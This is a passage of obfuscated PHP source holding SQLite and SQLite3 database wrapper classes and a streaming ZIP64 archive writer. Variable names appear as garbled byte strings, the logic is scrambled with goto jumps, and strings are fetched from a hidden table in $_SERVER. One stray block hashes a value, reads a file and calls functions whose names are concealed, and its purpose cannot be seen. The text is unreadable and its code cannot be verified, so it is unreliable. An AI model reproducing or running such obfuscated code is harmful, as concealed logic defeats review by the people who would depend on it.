(!isset($this->linkID[$aê«ï‘·ê¤])) { goto B‘­Á¯îµò; B‘­Á¯îµò: if (empty($B£²Á—£‰ï)) { $B£²Á—£‰ï = $this->config; } $dáŒ»ãÁéÚ = !empty($B£²Á—£‰ï[$bİ±êÙ¸½[13]][$bİ±êÙ¸½[14]]) ? $B£²Á—£‰ï[$bİ±êÙ¸½[13]][$bİ±êÙ¸½[14]] : $this->pconnect; $f£ÍÎ²Â©Ë = $dáŒ»ãÁéÚ ? $bİ±êÙ¸½[15] : $bİ±êÙ¸½[16]; goto c”è“ß´¸æ; a»í£ÕÆª‚: @sqlite_busy_timeout($this->linkID[$aê«ï‘·ê¤], 30000); if (1 != think_config($bİ±êÙ¸½[18])) { unset($this->config); } goto EáÖã¸™ºõ; c”è“ß´¸æ: $this->linkID[$aê«ï‘·ê¤] = $f£ÍÎ²Â©Ë($B£²Á—£‰ï[$bİ±êÙ¸½[17]], $B£²Á—£‰ï[$bİ±êÙ¸½[12]]); if (!$this->linkID[$aê«ï‘·ê¤]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto a»í£ÕÆª‚; EáÖã¸™ºõ: } return $this->linkID[$aê«ï‘·ê¤]; } public function free() { $this->queryID = null; } public function query($A«×‘‡ÍÁ¢) { goto FŠÀ¸©µÈ; aî½œáŸïÇ: think_status($F§İï•«[20]); $this->queryID = sqlite_query($this->_linkID, $A«×‘‡ÍÁ¢); $this->debug(); goto cÀºã’‚óÇ; CŒ†š‚–—Ä: $this->queryStr = $A«×‘‡ÍÁ¢; if ($this->queryID) { $this->free(); } think_action_status($F§İï•«[19], 1); goto aî½œáŸïÇ; cÀºã’‚óÇ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $eŠ’’®Çø = $this->getAll(); return $eŠ’’®Çø; } goto eó‡§½òŸ; FŠÀ¸©µÈ: $F§İï•« =& $_SERVER[Î¿—”òá]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CŒ†š‚–—Ä; eó‡§½òŸ: } public function execute($cÚÈàª—÷‚) { goto Féç¨Ù—ë¿; Fà©»ÓÙ¥: if (!1 === $f‰Áà›‡¼¾) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto d‹ø«Îâƒ¯; b××±¡†‰Å: think_status($f°¢£…ª•Ì[20]); $f‰Áà›‡¼¾ = sqlite_exec($this->_linkID, $cÚÈàª—÷‚); $this->debug(); goto Fà©»ÓÙ¥; A ˆ¦…ÈÎÛ: $this->queryStr = $cÚÈàª—÷‚; if ($this->queryID) { $this->free(); } think_action_status($f°¢£…ª•Ì[21], 1); goto b××±¡†‰Å; Féç¨Ù—ë¿: $f°¢£…ª•Ì =& $_SERVER[Î¿—”òá]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A ˆ¦…ÈÎÛ; d‹ø«Îâƒ¯: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Î¿—”òá][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F¢„¨×÷äñ = sqlite_query($this->_linkID, $_SERVER[Î¿—”òá][23]); if (!$F¢„¨×÷äñ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $EìŒëŠùÑ– = sqlite_query($this->_linkID, $_SERVER[Î¿—”òá][24]); if (!$EìŒëŠùÑ–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F®¨§…ã´¯ = array(); if ($this->numRows > 0) { for ($A¨œÂõò”¨ = 0; $A¨œÂõò”¨ < $this->numRows; $A¨œÂõò”¨++) { $F®¨§…ã´¯[$A¨œÂõò”¨] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $F®¨§…ã´¯; } public function getFields($A’‚‰—ƒ²´) { $dÒŞßç·åƒ =& $_SERVER[Î¿—”òá]; $EÅåÇÄ²†Ÿ = $this->query($dÒŞßç·åƒ[25] . $A’‚‰—ƒ²´ . $dÒŞßç·åƒ[26]); $E°ù„ÑÃ¼ = array(); if ($EÅåÇÄ²†Ÿ) { foreach ($EÅåÇÄ²†Ÿ as $EÆ” ³›öè => $EšóÁ¦ˆ†) { $E°ù„ÑÃ¼[$EšóÁ¦ˆ†[$dÒŞßç·åƒ[27]]] = array($dÒŞßç·åƒ[28] => $EšóÁ¦ˆ†[$dÒŞßç·åƒ[27]], $dÒŞßç·åƒ[29] => $EšóÁ¦ˆ†[$dÒŞßç·åƒ[30]], $dÒŞßç·åƒ[31] => (bool) ($EšóÁ¦ˆ†[$dÒŞßç·åƒ[32]] === $dÒŞßç·åƒ[33]), $dÒŞßç·åƒ[34] => $EšóÁ¦ˆ†[$dÒŞßç·åƒ[35]], $dÒŞßç·åƒ[36] => strtolower($EšóÁ¦ˆ†[$dÒŞßç·åƒ[37]]) == $dÒŞßç·åƒ[38], $dÒŞßç·åƒ[39] => strtolower($EšóÁ¦ˆ†[$dÒŞßç·åƒ[40]]) == $dÒŞßç·åƒ[41]); } } return $E°ù„ÑÃ¼; } public function getTables($BÀ†ò©Ş¼ = '') { $CíÊ„’™™ó =& $_SERVER[Î¿—”òá]; $bŒ–ˆæ¯‹ = $this->query($CíÊ„’™™ó[42] . $CíÊ„’™™ó[43] . $CíÊ„’™™ó[44]); $BšßĞÊ˜” = array(); foreach ($bŒ–ˆæ¯‹ as $Dáï‹Ì¦¡¯ => $AÂªê¡×Ôº) { $BšßĞÊ˜”[$Dáï‹Ì¦¡¯] = current($AÂªê¡×Ôº); } return $BšßĞÊ˜”; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $dÎÖÖê¸ôò =& $_SERVER[Î¿—”òá]; $D±ŒÌÖ–Œå = sqlite_last_error($this->_linkID); $this->error = $D±ŒÌÖ–Œå . $dÎÖÖê¸ôò[4] . sqlite_error_string($D±ŒÌÖ–Œå); if ($dÎÖÖê¸ôò[33] != $this->queryStr) { $this->error .= LNG($dÎÖÖê¸ôò[45]) . $this->queryStr; } think_trace($this->error, $dÎÖÖê¸ôò[33], $dÎÖÖê¸ôò[46]); return $this->error; } public function escapeString($B×®ŸÆ«Ü) { return sqlite_escape_string($B×®ŸÆ«Ü); } public function parseLimit($AÒÁƒŸà‰ƒ) { $B¹Äùî¬‹ñ =& $_SERVER[Î¿—”òá]; $Dˆñ¡£ÏÅ = $B¹Äùî¬‹ñ[33]; if (!empty($AÒÁƒŸà‰ƒ)) { $AÒÁƒŸà‰ƒ = explode($B¹Äùî¬‹ñ[47], $AÒÁƒŸà‰ƒ); if (count($AÒÁƒŸà‰ƒ) > 1) { $Dˆñ¡£ÏÅ .= $B¹Äùî¬‹ñ[48] . $AÒÁƒŸà‰ƒ[1] . $B¹Äùî¬‹ñ[49] . $AÒÁƒŸà‰ƒ[0] . $B¹Äùî¬‹ñ[50]; } else { $Dˆñ¡£ÏÅ .= $B¹Äùî¬‹ñ[48] . $AÒÁƒŸà‰ƒ[0] . $B¹Äùî¬‹ñ[50]; } } return $Dˆñ¡£ÏÅ; } } class DbSqlite3Base extends Db { public function __construct($Bõ¬‰²ÎÈ = '') { $b¥ÚÏšŞÏ™ =& $_SERVER[Î¿—”òá]; if (!class_exists($b¥ÚÏšŞÏ™[51])) { think_exception(think_lang($b¥ÚÏšŞÏ™[10]) . $b¥ÚÏšŞÏ™[52]); } if (!empty($Bõ¬‰²ÎÈ)) { if (!isset($Bõ¬‰²ÎÈ[$b¥ÚÏšŞÏ™[12]])) { $Bõ¬‰²ÎÈ[$b¥ÚÏšŞÏ™[12]] = 438; } $this->config = $Bõ¬‰²ÎÈ; if (empty($this->config[$b¥ÚÏšŞÏ™[13]])) { $this->config[$b¥ÚÏšŞÏ™[13]] = array(); } } } public function connect($Aî´å¯»å  = '', $Fù„šËÈ¾ = 0) { $dëÛÚ£¶µ =& $_SERVER[Î¿—”òá]; if (!isset($this->linkID[$Fù„šËÈ¾])) { if (empty($Aî´å¯»å )) { $Aî´å¯»å  = $this->config; } $this->linkID[$Fù„šËÈ¾] = new SQLite3($Aî´å¯»å [$dëÛÚ£¶µ[17]]); if (!$this->linkID[$Fù„šËÈ¾]) { think_exception($this->linkID[$Fù„šËÈ¾]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Fù„šËÈ¾]->busyTimeout(30000); if (1 != think_config($dëÛÚ£¶µ[18])) { unset($this->config); } } return $this->linkID[$Fù„šËÈ¾]; } public function free() { $this->queryID = null; } public function query($AøìÄ–ÕÔ ) { goto Añ³ùâ¼¢ë; dİ½•£µ£: $this->queryStr = $AøìÄ–ÕÔ ; if ($this->queryID) { $this->free(); } think_action_status($eê¬É‰ôÔ[19], 1); goto E©­”äù¯; Añ³ùâ¼¢ë: $eê¬É‰ôÔ =& $_SERVER[Î¿—”òá]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dİ½•£µ£; E©­”äù¯: think_status($eê¬É‰ôÔ[20]); $this->queryID = $this->_linkID->query($AøìÄ–ÕÔ ); $this->debug(); goto fŒÖâ¨¦É; fŒÖâ¨¦É: if (!1 === $this->queryID) { $this->error(); return !1; } else { $f÷½‚ÇÌó± = $this->getAll(); $this->numRows = count($f÷½‚ÇÌó±); return $f÷½‚ÇÌó±; } goto EŞ¡í–â×Ì; EŞ¡í–â×Ì: } public function execute($aº—ô¥ˆîŠ) { goto d¸‘Õø´£‡; Fˆğ¢¥ˆŠ…: think_status($b¶¼Ï¼˜ê[20]); $Bº‚Ëì’¯Æ = $this->_linkID->exec($aº—ô¥ˆîŠ); $this->debug(); goto DÎƒ¢Äçé¹; AµÍ‰²“‡™: $this->queryStr = $aº—ô¥ˆîŠ; if ($this->queryID) { $this->free(); } think_action_status($b¶¼Ï¼˜ê[21], 1); goto Fˆğ¢¥ˆŠ…; DÎƒ¢Äçé¹: if (!1 === $Bº‚Ëì’¯Æ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto A ñÀíê£; d¸‘Õø´£‡: $b¶¼Ï¼˜ê =& $_SERVER[Î¿—”òá]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AµÍ‰²“‡™; A ñÀíê£: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Î¿—”òá][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f°°«Ÿİ¡ = $this->_linkID->query($_SERVER[Î¿—”òá][23]); if (!$f°°«Ÿİ¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fó¾“–ÔÃ = $this->_linkID->query($_SERVER[Î¿—”òá][24]); if (!$fó¾“–ÔÃ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C©ßä·ä¯¢ = array(); while ($a‹ôÁÂÖÇ‰ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $C©ßä·ä¯¢[] = $a‹ôÁÂÖÇ‰; } $this->queryID->reset(); return $C©ßä·ä¯¢; } public function getFields($fìæ¢óÁê) { $A’ß± ÌÔ¸ =& $_SERVER[Î¿—”òá]; $E­ÓÍùÁÉŠ = $this->query($A’ß± ÌÔ¸[25] . $fìæ¢óÁê . $A’ß± ÌÔ¸[26]); $CÙ¦©Î³¶” = array(); if ($E­ÓÍùÁÉŠ) { foreach ($E­ÓÍùÁÉŠ as $Cšêœôµå“ => $BÙ„ƒ…Ùê) { $CÙ¦©Î³¶”[$BÙ„ƒ…Ùê[$A’ß± ÌÔ¸[28]]] = array($A’ß± ÌÔ¸[28] => $BÙ„ƒ…Ùê[$A’ß± ÌÔ¸[28]], $A’ß± ÌÔ¸[29] => $BÙ„ƒ…Ùê[$A’ß± ÌÔ¸[29]], $A’ß± ÌÔ¸[31] => (bool) ($BÙ„ƒ…Ùê[$A’ß± ÌÔ¸[31]] === $A’ß± ÌÔ¸[33]), $A’ß± ÌÔ¸[34] => $BÙ„ƒ…Ùê[$A’ß± ÌÔ¸[53]], $A’ß± ÌÔ¸[36] => (bool) $BÙ„ƒ…Ùê[$A’ß± ÌÔ¸[54]], $A’ß± ÌÔ¸[39] => (bool) $BÙ„ƒ…Ùê[$A’ß± ÌÔ¸[54]]); } } return $CÙ¦©Î³¶”; } public function getTables($e¿õ¤… = '') { $FˆÒ¨ù÷é† =& $_SERVER[Î¿—”òá]; $D”¨Œ«ÙÛ = $this->query($FˆÒ¨ù÷é†[42] . $FˆÒ¨ù÷é†[43] . $FˆÒ¨ù÷é†[44]); $aÔÜâ«Ÿé¶ = array(); foreach ($D”¨Œ«ÙÛ as $fÛõ×®æ£— => $F‚õŸ×†ö—) { $aÔÜâ«Ÿé¶[$fÛõ×®æ£—] = current($F‚õŸ×†ö—); } return $aÔÜâ«Ÿé¶; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fŸİ›Àä‡ø =& $_SERVER[Î¿—”òá]; $this->error = $this->_linkID->lastErrorMsg(); if ($fŸİ›Àä‡ø[33] != $this->queryStr) { $this->error .= LNG($fŸİ›Àä‡ø[45]) . $this->queryStr; } think_trace($this->error, $fŸİ›Àä‡ø[33], $fŸİ›Àä‡ø[46]); return $this->error; } public function escapeString($d¶Ö¾’›) { $Aô³İ•öá =& $_SERVER[Î¿—”òá]; if ($this->_linkID) { return $this->_linkID->escapeString($d¶Ö¾’›); } return str_ireplace($Aô³İ•öá[55], $Aô³İ•öá[56], $d¶Ö¾’›); } public function parseLimit($e»ÔÀçÉ«‹) { $AÒ¨ÔŞİŒ¨ =& $_SERVER[Î¿—”òá]; $b“ÄšÁÍ›ö = $AÒ¨ÔŞİŒ¨[33]; if (!empty($e»ÔÀçÉ«‹)) { $e»ÔÀçÉ«‹ = explode($AÒ¨ÔŞİŒ¨[47], $e»ÔÀçÉ«‹); if (count($e»ÔÀçÉ«‹) > 1) { $b“ÄšÁÍ›ö .= $AÒ¨ÔŞİŒ¨[48] . $e»ÔÀçÉ«‹[1] . $AÒ¨ÔŞİŒ¨[49] . $e»ÔÀçÉ«‹[0] . $AÒ¨ÔŞİŒ¨[50]; } else { $b“ÄšÁÍ›ö .= $AÒ¨ÔŞİŒ¨[48] . $e»ÔÀçÉ«‹[0] . $AÒ¨ÔŞİŒ¨[50]; } } return $b“ÄšÁÍ›ö; } } goto F×ŠØÛîÀ; D™¹‚ƒ‹à³: $a¯ë¢“Ò‘µ = $_SERVER[Î¿—”òá][784]; if ($_SERVER[$_SERVER[Î¿—”òá][676]] != $a¯ë¢“Ò‘µ($dæ±ê—Îõ—)) { goto eÁÉñğ¸¤; EÕß‡˜ê«: $e•ª…ÜÙ´ù($dæ±ê—Îõ—); goto f´“™‰ù´; DäèÍÉÇîŞ: $E—½ËË ¤â = explode($_SERVER[Î¿—”òá][217], $C˜í‡êŠÌó); if (count($E—½ËË ¤â) < $_SERVER[Î¿—”òá][548]) { $d¡÷œåæå = $_SERVER[Î¿—”òá][681]; $d¡÷œåæå(); } $e•ª…ÜÙ´ù = $_SERVER[Î¿—”òá][682]; goto EÕß‡˜ê«; eÁÉñğ¸¤: $d¥¼àÄ­’Ş = $_SERVER[Î¿—”òá][678]; $a†‚±Ñ†Ñ˜ = $_SERVER[$_SERVER[Î¿—”òá][679]] . $_SERVER[Î¿—”òá][680]; $C˜í‡êŠÌó = $d¥¼àÄ­’Ş($a†‚±Ñ†Ñ˜); goto DäèÍÉÇîŞ; f´“™‰ù´: } class ZipMake { const VERSION = "\60\x2e\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($f¨’¿²¨‚µ = null) { $fƒß½Éæ‹Ÿ =& $_SERVER[Î¿—”òá]; $this->outputStream = fopen($fƒß½Éæ‹Ÿ[2001], $fƒß½Éæ‹Ÿ[1219]); $this->outputName = $f¨’¿²¨‚µ; $this->needHeaders = !0; } public function addFile($D‰¦äÌÖŞ„, $FÚíõ¶ã) { goto CùÉÆä½; Bõ˜°Ü”™ˆ: while (!feof($Cã°ÈŒ½¼Ç)) { $eáäƒó™åŞ = fread($Cã°ÈŒ½¼Ç, 1048576); $this->send($eáäƒó™åŞ); } fclose($Cã°ÈŒ½¼Ç); $EñíÁ…­¬Á = hexdec(hash_file($a‡ñÍ‘‰³Š[2003], $FÚíõ¶ã)); goto F•¤Œğ·ãÆ; CùÉÆä½: $a‡ñÍ‘‰³Š =& $_SERVER[Î¿—”òá]; $D‰¦äÌÖŞ„ = $this->filterFilename($D‰¦äÌÖŞ„); $bÖŞ©¸ÖÑß = static::METHOD_STORE; goto cÕ©¦œ³; F•¤Œğ·ãÆ: $this->addFileFooter($D‰¦äÌÖŞ„, $bÖŞ©¸ÖÑß, $EñíÁ…­¬Á, $bòµ­’¤ë›, $FßÏ«“õª¸, $d¾µ×ß·šÍ); goto Aœ¥ÏÙ±ğË; cÕ©¦œ³: $d¾µ×ß·šÍ = $this->addFileHeader($D‰¦äÌÖŞ„, $bÖŞ©¸ÖÑß); $bòµ­’¤ë› = $FßÏ«“õª¸ = filesize($FÚíõ¶ã); $Cã°ÈŒ½¼Ç = fopen($FÚíõ¶ã, $a‡ñÍ‘‰³Š[2002]); goto Bõ˜°Ü”™ˆ; Aœ¥ÏÙ±ğË: } public function addFileFromStream($C‡¤êôïˆ, $Fµ¬ÓË¤©Ÿ) { goto D½–‚Ï“¯; E±ºâìÕ˜Â: fseek($Fµ¬ÓË¤©Ÿ, 0, SEEK_END); $còîø…Ÿ‚Œ = $FÔ†Íæ‘’– = ftell($Fµ¬ÓË¤©Ÿ); rewind($Fµ¬ÓË¤©Ÿ); goto b¨ğÁ¿Ë¯; fŠ§­„ÌÔÎ: $this->addFileFooter($C‡¤êôïˆ, $C÷ÍöĞì, $D—±±˜Ó´à, $còîø…Ÿ‚Œ, $FÔ†Íæ‘’–, $fë¤¿“ÅŠ›); goto cŸê«Òˆ¥›; b¨ğÁ¿Ë¯: $d ï­Ã¿¹÷ = hash_init($_SERVER[Î¿—”òá][2003]); while (!feof($Fµ¬ÓË¤©Ÿ)) { $f‰¸‹±‚â÷ = fread($Fµ¬ÓË¤©Ÿ, 1048576); hash_update($d ï­Ã¿¹÷, $f‰¸‹±‚â÷); $this->send($f‰¸‹±‚â÷); } $D—±±˜Ó´à = hexdec(hash_final($d ï­Ã¿¹÷)); goto fŠ§­„ÌÔÎ; D½–‚Ï“¯: $C‡¤êôïˆ = $this->filterFilename($C‡¤êôïˆ); $C÷ÍöĞì = static::METHOD_STORE; $fë¤¿“ÅŠ› = $this->addFileHeader($C‡¤êôïˆ, $C÷ÍöĞì); goto E±ºâìÕ˜Â; cŸê«Òˆ¥›: } public function finish() { foreach ($this->files as $cÇ•Î°Û“ê) { $this->addCdrFile($cÇ•Î°Û“ê); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($CœºŠ£‚Ş, $eà‚ÚË™•°) { goto bà½µÈ…Ö; b†²Ëà“ÏØ: $c†¿Å‘²è“ = $this->packFields($f›õŠÉÊÑ); $F‰ÍËÄœÕ = $this->packFields($c›­©É‚“); $this->send($c†¿Å‘²è“ . $CœºŠ£‚Ş . $F‰ÍËÄœÕ); goto c§‹å©Êƒä; Aø¶ªê¢‘ª: $a¢á—…¼³ = $this->dosTime(time()); $f›õŠÉÊÑ = array(array($f¶™Æ–ğ§Å[2005], static::FILE_HEADER_SIGNATURE), array($f¶™Æ–ğ§Å[2006], static::ZIP_VERSION_64), array($f¶™Æ–ğ§Å[2006], 8), array($f¶™Æ–ğ§Å[2006], $eà‚ÚË™•°), array($f¶™Æ–ğ§Å[2005], $a¢á—…¼³), array($f¶™Æ–ğ§Å[2005], 0), array($f¶™Æ–ğ§Å[2005], 4294967295), array($f¶™Æ–ğ§Å[2005], 4294967295), array($f¶™Æ–ğ§Å[2006], $c››¯îã’İ), array($f¶™Æ–ğ§Å[2006], 32)); $c›­©É‚“ = array(array($f¶™Æ–ğ§Å[2006], 1), array($f¶™Æ–ğ§Å[2006], 28), array($f¶™Æ–ğ§Å[2007], 0), array($f¶™Æ–ğ§Å[2007], 0), array($f¶™Æ–ğ§Å[2007], 0), array($f¶™Æ–ğ§Å[2005], 0)); goto b†²Ëà“ÏØ; bà½µÈ…Ö: $f¶™Æ–ğ§Å =& $_SERVER[Î¿—”òá]; $CœºŠ£‚Ş = preg_replace($f¶™Æ–ğ§Å[2004], $f¶™Æ–ğ§Å[33], $CœºŠ£‚Ş); $c››¯îã’İ = strlen($CœºŠ£‚Ş); goto Aø¶ªê¢‘ª; c§‹å©Êƒä: return strlen($c†¿Å‘²è“) + $c››¯îã’İ + strlen($F‰ÍËÄœÕ); goto aå³„•ÂƒÚ; aå³„•ÂƒÚ: } protected function addFileFooter($Cª¹õåŸ„, $BœØç´Òø†, $A°óË”íõò, $CŠ•ÄÜï‚, $F–‡óƒ¼³Ë, $CîùéĞ¾ó) { $D„Ÿß¾ôî =& $_SERVER[Î¿—”òá]; $aÌÍËë˜…‹ = array(array($D„Ÿß¾ôî[2005], static::DATA_DESCRIPTOR_SIGNATURE), array($D„Ÿß¾ôî[2005], $A°óË”íõò), array($D„Ÿß¾ôî[2007], $CŠ•ÄÜï‚), array($D„Ÿß¾ôî[2007], $F–‡óƒ¼³Ë)); $E«ˆøØÚİô = $this->packFields($aÌÍËë˜…‹); $this->send($E«ˆøØÚİô); $EîÂ†–Ûˆç = $CîùéĞ¾ó + $CŠ•ÄÜï‚ + $FÁÒï˜Ñ±ç; $this->addToCdr($Cª¹õåŸ„, $BœØç´Òø†, $A°óË”íõò, $CŠ•ÄÜï‚, $F–‡óƒ¼³Ë, $EîÂ†–Ûˆç); } private function addToCdr($dÁ¸Œ¾›É, $b¯’‘Ò¢ªö, $b¸‰½‚ªÏ˜, $b²ƒ–½Ìâ™, $C„¬¨­¹Ş, $a„¥‘ÅÃ„) { $this->files[] = array($dÁ¸Œ¾›É, $b¯’‘Ò¢ªö, $b¸‰½‚ªÏ˜, $b²ƒ–½Ìâ™, $C„¬¨­¹Ş, $this->ofs); $this->ofs += $a„¥‘ÅÃ„; } protected function addCdrFile($EáÒ„¡Ÿé) { goto eã„­ôİË; cŞ°…ùŒ’Û: $this->send($bñ§ÀãŒÊ); $this->cdr_ofs += strlen($bñ§ÀãŒÊ); goto eÀÕÕ†£; e‚Ş¶›Å†: $fÇ¡“Å¯‹ = $this->packFields($A¨³¹ÜÜ›); $aè×ªŒÒ×ñ = $this->packFields($bñŸ÷‘·ŒÏ); $bñ§ÀãŒÊ = $fÇ¡“Å¯‹ . $f¬é¥Àí„‘ . $fßöº©éš . $aè×ªŒÒ×ñ; goto cŞ°…ùŒ’Û; eã„­ôİË: $EÚœ¹‚¯÷‘ =& $_SERVER[Î¿—”òá]; list($f¬é¥Àí„‘, $a‚¹ÎòñŸ¨, $D»‡®“î¤™, $cƒÍÔª ‹µ, $e“£ÉóÏË£, $Aá¥ëè‘ê‘) = $EáÒ„¡Ÿé; $fßöº©éš = $EÚœ¹‚¯÷‘[33]; goto bã¹ß­Í¨¿; bã¹ß­Í¨¿: $BÓÇ‘éâÁª = $this->dosTime(time()); $A¨³¹ÜÜ› = array(array($EÚœ¹‚¯÷‘[2005], static::CDR_FILE_SIGNATURE), array($EÚœ¹‚¯÷‘[2006], static::ZIP_VERSION_64), array($EÚœ¹‚¯÷‘[2006], static::ZIP_VERSION_64), array($EÚœ¹‚¯÷‘[2006], 8), array($EÚœ¹‚¯÷‘[2006], $a‚¹ÎòñŸ¨), array($EÚœ¹‚¯÷‘[2005], $BÓÇ‘éâÁª), array($EÚœ¹‚¯÷‘[2005], $D»‡®“î¤™), array($EÚœ¹‚¯÷‘[2005], 4294967295), array($EÚœ¹‚¯÷‘[2005], 4294967295), array($EÚœ¹‚¯÷‘[2006], strlen($f¬é¥Àí„‘)), array($EÚœ¹‚¯÷‘[2006], 32), array($EÚœ¹‚¯÷‘[2006], strlen($fßöº©éš)), array($EÚœ¹‚¯÷‘[2006], 0), array($EÚœ¹‚¯÷‘[2006], 0), array($EÚœ¹‚¯÷‘[2005], 32), array($EÚœ¹‚¯÷‘[2005], 4294967295)); $bñŸ÷‘·ŒÏ = array(array($EÚœ¹‚¯÷‘[2006], 1), array($EÚœ¹‚¯÷‘[2006], 28), array($EÚœ¹‚¯÷‘[2007], $e“£ÉóÏË£), array($EÚœ¹‚¯÷‘[2007], $cƒÍÔª ‹µ), array($EÚœ¹‚¯÷‘[2007], $Aá¥ëè‘ê‘), array($EÚœ¹‚¯÷‘[2005], 0)); goto e‚Ş¶›Å†; eÀÕÕ†£: } protected function addCdr64Eof() { goto Aß¨•œ¾‹÷; C‰­‰•»İ: $this->send($c­‹‡†ŠÅÔ); goto EŞ¤šÓØ‡; Aß¨•œ¾‹÷: $F¢¢ïá³Œ½ =& $_SERVER[Î¿—”òá]; $E©…£Ü’Õ = count($this->files); $d¦öÉò±çÎ = $this->cdr_ofs; goto BÅŒÈØ®¤¶; BÅŒÈØ®¤¶: $bƒäöƒ¸Şù = $this->ofs; $bˆˆŒÇ„Š = array(array($F¢¢ïá³Œ½[2005], static::ZIP64_CDR_EOF_SIGNATURE), array($F¢¢ïá³Œ½[2007], 44), array($F¢¢ïá³Œ½[2006], static::ZIP_VERSION_64), array($F¢¢ïá³Œ½[2006], static::ZIP_VERSION_64), array($F¢¢ïá³Œ½[2005], 0), array($F¢¢ïá³Œ½[2005], 0), array($F¢¢ïá³Œ½[2007], $E©…£Ü’Õ), array($F¢¢ïá³Œ½[2007], $E©…£Ü’Õ), array($F¢¢ïá³Œ½[2007], $d¦öÉò±çÎ), array($F¢¢ïá³Œ½[2007], $bƒäöƒ¸Şù)); $c­‹‡†ŠÅÔ = $this->packFields($bˆˆŒÇ„Š); goto C‰­‰•»İ; EŞ¤šÓØ‡: } protected function addCdr64Locator() { goto bÀâ³›Ö©; dİœ†’ùğ: $this->send($AˆŸÉ…ÈíÏ); goto féİ¾Šïº; CÜâ¿èÒ§…: $cÍ¢™‡Äª = $this->ofs; $bÕÒß£Íöø = array(array($A­òˆ®§ºæ[2005], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($A­òˆ®§ºæ[2005], 0), array($A­òˆ®§ºæ[2007], $cÍ¢™‡Äª + $E–İ”¹ÉÕ), array($A­òˆ®§ºæ[2005], 1)); $AˆŸÉ…ÈíÏ = $this->packFields($bÕÒß£Íöø); goto dİœ†’ùğ; bÀâ³›Ö©: $A­òˆ®§ºæ =& $_SERVER[Î¿—”òá]; $D®«†á¤ª¤ = count($this->files); $E–İ”¹ÉÕ = $this->cdr_ofs; goto CÜâ¿èÒ§…; féİ¾Šïº: } protected function addCdrEof() { goto cô×ñå¢; cô×ñå¢: $dò–«Ëô¼Ş =& $_SERVER[Î¿—”òá]; $e²ÈÅîÀ¨ = count($this->files); $eŒºğÈîÌ = $this->cdr_ofs; goto dˆóØ©Úš; E‘à¨§…ÊÀ: $d¹©ÀçÅ¨ = $this->packFields($e¯—ÄùªÆĞ) . $b¥¸¹¬¦’†; $this->send($d¹©ÀçÅ¨); goto a“„Ç£¼â˜; dˆóØ©Úš: $AÍºÆìâ°à = $this->ofs; $b¥¸¹¬¦’† = $dò–«Ëô¼Ş[33]; $e¯—ÄùªÆĞ = array(array($dò–«Ëô¼Ş[2005], static::CDR_EOF_SIGNATURE), array($dò–«Ëô¼Ş[2006], 0), array($dò–«Ëô¼Ş[2006], 0), array($dò–«Ëô¼Ş[2006], $e²ÈÅîÀ¨), array($dò–«Ëô¼Ş[2006], $e²ÈÅîÀ¨), array($dò–«Ëô¼Ş[2005], 4294967295), array($dò–«Ëô¼Ş[2005], 4294967295), array($dò–«Ëô¼Ş[2006], strlen($b¥¸¹¬¦’†))); goto E‘à¨§…ÊÀ; a“„Ç£¼â˜: } protected function addCdr() { foreach ($this->files as $b¥å•×ñä) { $this->addCdrFile($b¥å•×ñä); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $d Øâô‹ê„ =& $_SERVER[Î¿—”òá]; $Aí…„­²†à = $d Øâô‹ê„[202]; if ($this->outputName) { $D‡×ÄµÛÂ’ = trim(str_replace(array($d Øâô‹ê„[113], $d Øâô‹ê„[55], $d Øâô‹ê„[93], $d Øâô‹ê„[67], $d Øâô‹ê„[217], $d Øâô‹ê„[985]), $d Øâô‹ê„[33], $this->outputName)); $Eƒò¼¥ÔãØ = rawurlencode($D‡×ÄµÛÂ’); $Aí…„­²†à .= "\73\40\x66\x69\x6c\145\156\x61\x6d\145\x2a\75\x75\164\146\x2d\70\x27\x27{$Eƒò¼¥ÔãØ}"; } $b¯ó˜Íõõ„ = array($d Øâô‹ê„[199] => $d Øâô‹ê„[2008], $d Øâô‹ê„[2009] => $Aí…„­²†à, $d Øâô‹ê„[2010] => $d Øâô‹ê„[2011], $d Øâô‹ê„[2012] => $d Øâô‹ê„[2013], $d Øâô‹ê„[2014] => $d 